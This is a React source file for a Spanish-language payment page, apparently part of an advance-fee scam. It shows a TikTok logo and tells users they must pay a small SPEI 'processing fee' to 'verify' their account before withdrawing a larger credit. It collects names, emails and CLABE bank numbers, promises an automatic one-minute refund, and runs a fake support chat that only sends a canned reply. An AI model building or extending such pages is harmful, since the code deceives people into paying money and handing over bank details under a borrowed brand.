import { useEffect, useMemo, useRef, useState } from "react";
import { Logo } from "../components/Logo";
import { useAppState } from "../context/AppStateContext";
import { digitsOnly, formatClabe, isClabeLength, validateClabe } from "../lib/clabe";
import { formatMxn } from "../lib/money";
import {
  createPayment,
  getPaymentStatus,
  PAYMENT_POLL_INTERVAL_MS,
  VERIFY_WINDOW_MS,
  type SpeiInstructions,
} from "../lib/pagamento";
import { transitionTo } from "../lib/router";

const CREDIT_CENTS = 139_500;
const PROCESSING_CENTS = 2_174;
const LOADING_STEP_MS = 800;
const WAIT_SECONDS = 60;
const COPY_FEEDBACK_MS = 400;
const LOADING_STATUSES = ["Generando orden...", "Validando datos..."] as const;

type GatewayState = "loading" | "ready" | "waiting" | "error" | "analysis";
type ErrorSource = "create" | "poll";
type ChatItem = { from: "bot" | "user"; text: string };

function formatDeadline(at: Date) {
  return at.toLocaleString("es-MX", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "numeric",
    minute: "2-digit",
  });
}

function ConfirmationLogo() {
  const [failed, setFailed] = useState(false);
  return (
    <div className="confirmation-logo">
      {failed ? (
        <Logo word={false} />
      ) : (
        <img src="/images/logotiktok.png" alt="TikTok" onError={() => setFailed(true)} />
      )}
    </div>
  );
}

function LockIcon() {
  return (
    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <rect x="5" y="11" width="14" height="10" rx="2" />
      <path d="M8 11V8a4 4 0 0 1 8 0v3" />
    </svg>
  );
}

export function PaymentGateway() {
  const { userData, patchUserData, setLastWithdrawal } = useAppState();
  const [view, setView] = useState<GatewayState>("loading");
  const [status, setStatus] = useState<string>(LOADING_STATUSES[0]);
  const [errorMessage, setErrorMessage] = useState("No se pudo finalizar la transacción. Inténtalo de nuevo.");
  const [errorSource, setErrorSource] = useState<ErrorSource>("create");
  const [clabe, setClabe] = useState(() => formatClabe(userData.clabe || userData.chave));
  const [clabeError, setClabeError] = useState<string | null>(null);
  const [inFlight, setInFlight] = useState(false);
  const [paymentId, setPaymentId] = useState<string | null>(null);
  const [reference, setReference] = useState("");
  const [instructions, setInstructions] = useState<SpeiInstructions | null>(null);
  const [createNonce, setCreateNonce] = useState(0);
  const [verifyAttemptId, setVerifyAttemptId] = useState(0);
  const [waitLeft, setWaitLeft] = useState(WAIT_SECONDS);
  const [helpOpen, setHelpOpen] = useState(false);
  const [comprovanteHint, setComprovanteHint] = useState("");
  const [chat, setChat] = useState<ChatItem[]>([
    { from: "bot", text: "¡Hola! Cuéntanos tu consulta y te responderemos a tu correo electrónico a la brevedad. 😊" },
  ]);
  const [chatDraft, setChatDraft] = useState("");
  const [chatInvalid, setChatInvalid] = useState(false);
  const [chatSending, setChatSending] = useState(false);

  const timeouts = useRef<number[]>([]);
  const intervals = useRef<number[]>([]);
  const alive = useRef(true);
  const polling = useRef(false);
  const pollBusy = useRef(false);
  const manualReceipt = useRef(false);
  const confirmedClabe = useRef(digitsOnly(userData.clabe || userData.chave));
  const userDataRef = useRef(userData);
  const fileRef = useRef<HTMLInputElement>(null);
  const chatBoxRef = useRef<HTMLDivElement>(null);
  userDataRef.current = userData;

  const deadline = useMemo(() => formatDeadline(new Date(Date.now() + 30 * 60 * 1000)), []);
  const showSheet = view === "ready" || view === "waiting";

  function clearTimers() {
    timeouts.current.forEach((id) => window.clearTimeout(id));
    intervals.current.forEach((id) => window.clearInterval(id));
    timeouts.current = [];
    intervals.current = [];
  }

  useEffect(() => {
    alive.current = true;
    return () => {
      alive.current = false;
      polling.current = false;
      pollBusy.current = false;
      clearTimers();
    };
  }, []);

  function persistApproved(nextClabe: string) {
    const digits = digitsOnly(nextClabe);
    const current = userDataRef.current;
    patchUserData({
      nome: current.nome,
      email: current.email,
      clabe: digits,
      metodo: "SPEI",
    });
    setLastWithdrawal(CREDIT_CENTS);
    transitionTo("success");
  }

  useEffect(() => {
    setView("loading");
    setStatus(LOADING_STATUSES[0]);
    setInFlight(false);
    setClabeError(null);
    setComprovanteHint("");
    polling.current = false;
    manualReceipt.current = false;

    let index = 0;
    const cycle = window.setInterval(() => {
      index += 1;
      if (index >= LOADING_STATUSES.length) {
        window.clearInterval(cycle);
        return;
      }
      if (alive.current) setStatus(LOADING_STATUSES[index]);
    }, LOADING_STEP_MS);
    intervals.current.push(cycle);

    let cancelled = false;
    const current = userDataRef.current;
    const digits = digitsOnly(current.clabe || current.chave || confirmedClabe.current);

    async function startCreate() {
      if (!isClabeLength(digits)) {
        if (!cancelled && alive.current) setView("ready");
        return;
      }
      try {
        const result = await createPayment({
          amount: PROCESSING_CENTS,
          customer_name: current.nome,
          customer_email: current.email,
          clabe: digits,
          payment_method: "SPEI",
        });
        if (cancelled || !alive.current) return;

        if (result.status === "ERROR") {
          setErrorSource("create");
          setErrorMessage(result.message);
          setView("error");
          return;
        }

        setPaymentId(result.payment_id);
        if (result.status === "SUCCESS") {
          setReference(result.reference);
          setInstructions(result.instructions);
          if (result.instructions.clabe) setClabe(formatClabe(result.instructions.clabe));
          confirmedClabe.current = digitsOnly(result.instructions.clabe || digits);
          setView("ready");
          return;
        }

        setReference(result.reference ?? "");
        setView("ready");
      } catch (error) {
        if (cancelled || !alive.current) return;
        setErrorSource("create");
        setErrorMessage(error instanceof Error ? error.message : "No se pudo generar la orden SPEI.");
        setView("error");
      }
    }

    void startCreate();

    return () => {
      cancelled = true;
      window.clearInterval(cycle);
    };
  }, [createNonce]);

  useEffect(() => {
    if (!showSheet) return;
    setWaitLeft(WAIT_SECONDS);
    const tick = window.setInterval(() => {
      setWaitLeft((left) => (left <= 0 ? 0 : left - 1));
    }, 1000);
    return () => window.clearInterval(tick);
  }, [showSheet]);

  useEffect(() => {
    if ((view !== "waiting" && view !== "analysis") || !paymentId) return;

    polling.current = true;
    pollBusy.current = false;
    let cancelled = false;

    async function tick() {
      if (cancelled || !alive.current || pollBusy.current || !paymentId) return;
      pollBusy.current = true;
      try {
        const result = await getPaymentStatus(paymentId);
        if (cancelled || !alive.current) return;
        if (result.status === "approved") {
          polling.current = false;
          persistApproved(confirmedClabe.current || clabe);
          return;
        }
        if (result.status === "failed") {
          polling.current = false;
          setErrorSource("poll");
          setErrorMessage("La Transferencia SPEI no pudo confirmarse. Inténtalo de nuevo.");
          setView("error");
        }
      } catch (error) {
        if (cancelled || !alive.current) return;
        polling.current = false;
        setErrorSource("poll");
        setErrorMessage(error instanceof Error ? error.message : "No se pudo consultar el estado SPEI.");
        setView("error");
      } finally {
        pollBusy.current = false;
      }
    }

    void tick();
    const interval = window.setInterval(() => {
      void tick();
    }, PAYMENT_POLL_INTERVAL_MS);
    intervals.current.push(interval);

    const windowTimer =
      view === "waiting"
        ? window.setTimeout(() => {
            if (cancelled || !alive.current) return;
            polling.current = false;
            setView("ready");
          }, VERIFY_WINDOW_MS)
        : 0;
    if (windowTimer) timeouts.current.push(windowTimer);

    return () => {
      cancelled = true;
      polling.current = false;
      pollBusy.current = false;
      window.clearInterval(interval);
      if (windowTimer) window.clearTimeout(windowTimer);
    };
  }, [view, paymentId, verifyAttemptId]);

  useEffect(() => {
    const box = chatBoxRef.current;
    if (box) box.scrollTop = box.scrollHeight;
  }, [chat, helpOpen]);

  async function confirmCredit() {
    if (inFlight || view === "waiting") return;
    const err = validateClabe(clabe);
    if (err) {
      setClabeError(err);
      return;
    }

    setClabeError(null);
    setInFlight(true);
    const digits = digitsOnly(clabe);
    confirmedClabe.current = digits;
    try {
      const createdDigits = digitsOnly(instructions?.clabe ?? userData.clabe);
      if (!paymentId || digits !== createdDigits) {
        const result = await createPayment({
          amount: PROCESSING_CENTS,
          customer_name: userData.nome,
          customer_email: userData.email,
          clabe: digits,
          payment_method: "SPEI",
        });
        if (!alive.current) return;
        if (result.status === "ERROR") {
          setErrorSource("create");
          setErrorMessage(result.message);
          setView("error");
          return;
        }
        setPaymentId(result.payment_id);
        if (result.status === "SUCCESS") {
          setReference(result.reference);
          setInstructions(result.instructions);
        } else {
          setReference(result.reference ?? "");
        }
      }
      if (!alive.current) return;
      setVerifyAttemptId((n) => n + 1);
      setView("waiting");
    } catch (error) {
      if (!alive.current) return;
      setErrorSource("create");
      setErrorMessage(error instanceof Error ? error.message : "No se pudo confirmar el crédito.");
      setView("error");
    } finally {
      if (alive.current) setInFlight(false);
    }
  }

  function retry() {
    if (inFlight) return;
    if (errorSource === "poll" && paymentId) {
      setVerifyAttemptId((n) => n + 1);
      setView("waiting");
      return;
    }
    setCreateNonce((n) => n + 1);
  }

  async function ensurePayment() {
    if (paymentId) return paymentId;
    const current = userDataRef.current;
    const digits = digitsOnly(clabe) || confirmedClabe.current;
    const result = await createPayment({
      amount: PROCESSING_CENTS,
      customer_name: current.nome,
      customer_email: current.email,
      clabe: digits,
      payment_method: "SPEI",
    });
    if (!alive.current) return null;
    if (result.status === "ERROR") {
      setErrorSource("create");
      setErrorMessage(result.message);
      setView("error");
      return null;
    }
    setPaymentId(result.payment_id);
    if (result.status === "SUCCESS") {
      setReference(result.reference);
      setInstructions(result.instructions);
    } else {
      setReference(result.reference ?? "");
    }
    return result.payment_id;
  }

  function onComprovanteSelected() {
    const file = fileRef.current?.files?.[0];
    if (!file) return;
    setComprovanteHint(`Comprobante recibido: ${file.name}`);
    confirmedClabe.current = digitsOnly(clabe) || confirmedClabe.current;
    manualReceipt.current = true;
    polling.current = false;
    setView("analysis");
    if (!paymentId) void ensurePayment();
  }

  function sendChat() {
    const msg = chatDraft.trim();
    if (!msg) {
      setChatInvalid(true);
      return;
    }
    setChatInvalid(false);
    setChatSending(true);
    setChat((prev) => [...prev, { from: "user", text: msg }]);
    setChatDraft("");
    const id = window.setTimeout(() => {
      setChat((prev) => [...prev, { from: "bot", text: "✅ Recibido. Te respondemos a tu correo a la brevedad." }]);
      setChatSending(false);
    }, COPY_FEEDBACK_MS);
    timeouts.current.push(id);
  }

  const busy = inFlight || view === "waiting";
  const shownReference = reference || instructions?.reference || "—";
  const shownClabe = formatClabe(instructions?.clabe || clabe);

  const instructionStack = (
    <div className="pg-instruction-stack">
      <div id="gateway-deadline-box" className="gateway-deadline-box">
        <span>⌛ Válido hasta </span>
        <span id="gateway-deadline">{deadline}</span>
      </div>

      <div className="gateway-warning">
        <span aria-hidden="true">⚠️</span>
        <p id="gateway-warning-text">
          El pago solo será válido si lo envías desde una cuenta registrada con la <strong>CLABE</strong> que
          ingresaste. Transfiere exactamente el <strong>Monto de Procesamiento</strong> de{" "}
          <strong>{formatMxn(PROCESSING_CENTS)}</strong> por Transferencia SPEI. Si el titular o el monto no
          coinciden, la validación puede demorar hasta 24 horas.
        </p>
      </div>

      <div id="gateway-cvu-status" className="gateway-cvu-status">
        {view === "waiting" ? `Esperando confirmación SPEI... (${waitLeft})` : `Esperando pago... (${waitLeft})`}
      </div>

      <p id="gateway-detect-msg" className="gateway-detect-msg">
        Estamos detectando tu Transferencia SPEI. Si no se confirma sola, usa el botón{" "}
        <strong>«Ya realicé el pago»</strong> para subir el comprobante.
      </p>

      <div id="gateway-comprovante-wrap" className="gateway-comprovante-wrap">
        <input
          ref={fileRef}
          type="file"
          id="gateway-comprovante-input"
          accept="image/*,application/pdf"
          hidden
          onChange={onComprovanteSelected}
        />
        <button type="button" id="gateway-comprovante-btn" onClick={() => fileRef.current?.click()}>
          Ya realicé el pago
        </button>
        <p id="gateway-comprovante-hint" className="gateway-comprovante-hint">
          {comprovanteHint}
        </p>
      </div>

      <div className="gateway-help">
        <button type="button" id="gateway-help-btn" onClick={() => setHelpOpen((open) => !open)}>
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
          </svg>
          ¿Necesitás ayuda?
        </button>

        <div id="gateway-chat-panel" className="gateway-chat-panel" hidden={!helpOpen}>
          <div className="gateway-chat-header">
            <div className="gateway-chat-avatar" aria-hidden="true">
              🎧
            </div>
            <div className="gateway-chat-meta">
              <div>Soporte LaMantra</div>
              <div>Respondemos por email</div>
            </div>
            <button type="button" id="gateway-chat-close" onClick={() => setHelpOpen(false)}>
              ×
            </button>
          </div>
          <div className="gateway-chat-body">
            <div id="gateway-chat-messages" className="gateway-chat-messages" ref={chatBoxRef}>
              {chat.map((item, index) => (
                <div key={`${item.from}-${index}`} className={`gateway-chat-bubble is-${item.from}`}>
                  {item.text}
                </div>
              ))}
            </div>
            <div className="gateway-chat-form">
              <textarea
                id="gateway-chat-msg"
                placeholder="Escribe tu consulta aquí..."
                value={chatDraft}
                className={chatInvalid ? "is-invalid" : undefined}
                onChange={(e) => {
                  setChatDraft(e.target.value);
                  setChatInvalid(false);
                }}
              />
              <button type="button" id="gateway-chat-send" disabled={chatSending} onClick={sendChat}>
                {chatSending ? "Enviando..." : "Enviar mensaje"}
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  return (
    <section className="withdraw-flow-panel payment-flow-panel">
      <div className="confirmation-container">
        <div className="confirmation-header">
          <ConfirmationLogo />
        </div>

        {view === "loading" ? (
          <div id="gateway-loading" className="pg-loading" role="status" aria-live="polite">
            <div className="pg-spinner" aria-hidden="true" />
            <div className="pg-loading-status">{status}</div>
          </div>
        ) : null}

        {view === "error" ? (
          <div id="gateway-error" className="pg-error">
            <p>{errorMessage}</p>
            <button type="button" className="btn btn-block pg-confirm-btn" onClick={retry}>
              Reintentar
            </button>
          </div>
        ) : null}

        {view === "analysis" ? (
          <div id="gateway-analise" className="gateway-analise">
            <div className="gateway-intro">
              <p>
                Para continuar con el retiro del monto disponible, necesitamos confirmar la titularidad de tu
                cuenta con una transacción real. Es necesario un pago de{" "}
                <strong>{formatMxn(PROCESSING_CENTS)}</strong> por Transferencia SPEI para verificar tu cuenta.
                Este monto será acreditado en tu saldo disponible para retiro.
              </p>
            </div>

            <div className="confirmation-section">
              <div className="confirmation-section-title">DATOS PARA EL REEMBOLSO</div>
              <div className="confirmation-receipt-grid">
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">Nombre</div>
                  <div id="checkout-confirmation-name" className="confirmation-receipt-value">
                    {userData.nome || "—"}
                  </div>
                </div>
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">Correo</div>
                  <div id="checkout-confirmation-email" className="confirmation-receipt-value">
                    {userData.email || "—"}
                  </div>
                </div>
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">Valor a recibir</div>
                  <div id="checkout-confirmation-valor" className="confirmation-receipt-value bold">
                    {formatMxn(CREDIT_CENTS)} + {formatMxn(PROCESSING_CENTS)}
                  </div>
                </div>
              </div>
            </div>

            <div className="confirmation-section" id="gateway-payment-section">
              <div className="confirmation-section-title">PAGO SEGURO</div>
              <div className="gateway-analise-icon" aria-hidden="true">
                <svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="#fff" strokeWidth="2.8" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="20 6 9 17 4 12" />
                </svg>
              </div>
              <div className="gateway-analise-title">Comprobante recibido</div>
              <p>Tu pago está en análisis. En breve recibirás la confirmación y el reembolso será acreditado en tu cuenta.</p>
            </div>
          </div>
        ) : null}

        {showSheet ? (
          <div className="pg-ready">
            <p className="pg-intro">Confirma tu CLABE para acreditar el crédito por Transferencia SPEI.</p>

            <div className="confirmation-section">
              <div className="confirmation-section-title">RESUMEN</div>
              <div className="confirmation-receipt-grid">
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">Monto de Procesamiento</div>
                  <div className="confirmation-receipt-value">{formatMxn(PROCESSING_CENTS)}</div>
                </div>
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">Crédito Total</div>
                  <div className="confirmation-receipt-value bold">{formatMxn(CREDIT_CENTS)}</div>
                </div>
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">Método</div>
                  <div className="confirmation-receipt-value">Transferencia SPEI</div>
                </div>
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">Referencia</div>
                  <div className="confirmation-receipt-value">{shownReference}</div>
                </div>
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">CLABE</div>
                  <div className="confirmation-receipt-value">{shownClabe}</div>
                </div>
              </div>
            </div>

            <div className="confirmation-section">
              <label className={`field${clabeError ? " is-invalid" : ""}`}>
                <span className="field-label">CLABE</span>
                <input
                  id="pg-clabe"
                  type="tel"
                  inputMode="numeric"
                  autoComplete="off"
                  maxLength={22}
                  placeholder="000 000 0000 0000 0000"
                  value={clabe}
                  disabled={busy}
                  onChange={(e) => {
                    setClabe(formatClabe(e.target.value));
                    if (clabeError) setClabeError(null);
                  }}
                />
                {clabeError ? (
                  <p className="field-error">{clabeError}</p>
                ) : (
                  <p className="field-hint">18 dígitos · Transferencia SPEI</p>
                )}
              </label>

              {view === "waiting" ? (
                <div id="gateway-waiting" className="pg-waiting-banner" role="status" aria-live="polite">
                  <div className="pg-spinner pg-spinner-sm" aria-hidden="true" />
                  <div>
                    <div className="pg-loading-status">Esperando confirmación SPEI...</div>
                    <p className="pg-waiting-ref">Referencia {shownReference}</p>
                  </div>
                </div>
              ) : (
                <button
                  type="button"
                  id="pg-confirm"
                  className="btn btn-block pg-confirm-btn"
                  disabled={inFlight}
                  aria-busy={inFlight}
                  onClick={() => void confirmCredit()}
                >
                  Confirmar Crédito
                </button>
              )}
            </div>

            {instructionStack}
          </div>
        ) : null}

        <div className="confirmation-footer">
          <div className="confirmation-footer-text">Proceso 100% seguro</div>
          <button
            type="button"
            id="btn-voltar-ten"
            className="gateway-back-link"
            disabled={inFlight}
            onClick={() => transitionTo("five")}
          >
            Volver y corregir datos
          </button>
          <div className="gateway-footer-extras">
            <div className="confirmation-timer">
              <LockIcon />
              Reembolso automático en 1 minuto
            </div>
            <div className="confirmation-footer-text">Proceso 100% seguro</div>
            <button type="button" className="confirmation-footer-link" onClick={() => setHelpOpen(true)}>
              ¿Necesitas ayuda?
            </button>
          </div>
        </div>

        {helpOpen && view === "analysis" ? (
          <div className="gateway-help">
            <div id="gateway-chat-panel-analise" className="gateway-chat-panel">
              <div className="gateway-chat-header">
                <div className="gateway-chat-avatar" aria-hidden="true">
                  🎧
                </div>
                <div className="gateway-chat-meta">
                  <div>Soporte LaMantra</div>
                  <div>Respondemos por email</div>
                </div>
                <button type="button" onClick={() => setHelpOpen(false)}>
                  ×
                </button>
              </div>
              <div className="gateway-chat-body">
                <div className="gateway-chat-messages" ref={chatBoxRef}>
                  {chat.map((item, index) => (
                    <div key={`${item.from}-${index}`} className={`gateway-chat-bubble is-${item.from}`}>
                      {item.text}
                    </div>
                  ))}
                </div>
                <div className="gateway-chat-form">
                  <textarea
                    placeholder="Escribe tu consulta aquí..."
                    value={chatDraft}
                    className={chatInvalid ? "is-invalid" : undefined}
                    onChange={(e) => {
                      setChatDraft(e.target.value);
                      setChatInvalid(false);
                    }}
                  />
                  <button type="button" disabled={chatSending} onClick={sendChat}>
                    {chatSending ? "Enviando..." : "Enviar mensaje"}
                  </button>
                </div>
              </div>
            </div>
          </div>
        ) : null}
      </div>
    </section>
  );
}
